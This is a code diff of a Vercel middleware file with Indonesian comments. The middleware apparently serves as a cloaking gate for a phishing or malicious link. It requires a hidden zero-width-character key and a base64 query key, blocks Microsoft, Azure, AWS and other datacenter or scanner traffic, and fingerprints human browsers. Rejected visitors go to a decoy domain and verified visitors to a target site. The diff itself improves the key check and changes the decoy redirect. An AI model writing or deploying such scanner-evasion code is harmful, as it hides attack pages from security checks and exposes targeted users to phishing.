@@ -5,7 +5,7 @@ export default async function middleware(req) {
   // Ambil IP (Header standar Vercel)
   const ip = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for')?.split(',')[0] || 'Unknown';
   
-  // 1. KONFIGURASI KUNCI RAHASIA
+  // 1. KONFIGURASI KUNCI RAHASIA (Ganti jika kamu mengubah kunci di Python)
   const KUNCI_RAHASIA_BASE64 = 'QWtzZXNIb3JlMjAyNg==';
 
   // 2. DETEKSI KUNCI GAIB (ZWC)
@@ -13,11 +13,15 @@ export default async function middleware(req) {
 
   // 3. BLOCK AKSES TANPA ZWC (PATH POLOS)
   if (!hasZwc && url.pathname === '/') {
+    // Abaikan favicon atau manifest agar log tidak penuh
+    if (url.pathname.includes('favicon') || url.pathname.includes('manifest')) {
+       return new Response(null, { status: 204 });
+    }
     console.log(`⚠️ NO ZWC | IP: ${ip} | UA: ${ua}`);
     return new Response('404 Not Found', { status: 404 });
   }
 
-  // 4. BLOCK DATA CENTER & MICROSOFT
+  // 4. BLOCK DATA CENTER & MICROSOFT (Filter Bot Corporate)
   const botIsps = ['microsoft', 'azure', 'amazon', 'aws', 'google cloud', 'digitalocean', 'hetzner', 'ovh'];
   const isServerIp = botIsps.some(isp => ua.includes(isp));
   const isMicrosoftBot = req.headers.has('x-ms-useragent') || ua.includes('office') || ua.includes('microsoft');
@@ -27,7 +31,7 @@ export default async function middleware(req) {
     return new Response('Error 403: Access Denied', { status: 403 });
   }
 
-  // 5. FINGERPRINTING MANUSIA
+  // 5. FINGERPRINTING MANUSIA (Validasi Browser)
   const hasAcceptLang = req.headers.has('accept-language'); 
   const hasAccept = req.headers.get('accept')?.includes('text/html');
   const isMobile = /iphone|ipad|android/.test(ua);
@@ -38,16 +42,20 @@ export default async function middleware(req) {
     return new Response('Error 403: Access Denied', { status: 403 });
   }
 
-  // 6. VERIFIKASI KUNCI STATIS BASE64
-  const base64Data = url.search.startsWith('?') ? url.search.substring(1) : '';
+  // 6. VERIFIKASI KUNCI STATIS BASE64 (FIXED FOR URL ENCODING)
+  let base64Data = url.search.startsWith('?') ? url.search.substring(1) : '';
+  
+  // Perbaikan: Decode karakter %3D kembali menjadi '=' agar Match dengan kunci asli
+  base64Data = decodeURIComponent(base64Data);
 
   if (base64Data !== KUNCI_RAHASIA_BASE64) {
     console.log(`❌ REJECTED: WRONG KEY | IP=${ip} | DATA=${base64Data}`);
-    return Response.redirect('https://vercel.com/', 302);
+    // Redirect ke domain utama jika kunci salah (agar bot tersesat)
+    return Response.redirect('https://gate.centralzero.mx/', 302);
   }
 
-  // 7. SUCCESS REDIRECT
-  console.log(`🚀 HUMAN SUCCESS: IP=${ip} | URL=${url.pathname}`);
+  // 7. SUCCESS REDIRECT & LOG
+  console.log(`🚀 HUMAN SUCCESS: IP=${ip} | URL=${url.pathname} | KEY=MATCH`);
   
   const targetUrl = 'https://nusaindahrp.com/?dev';
   return new Response(
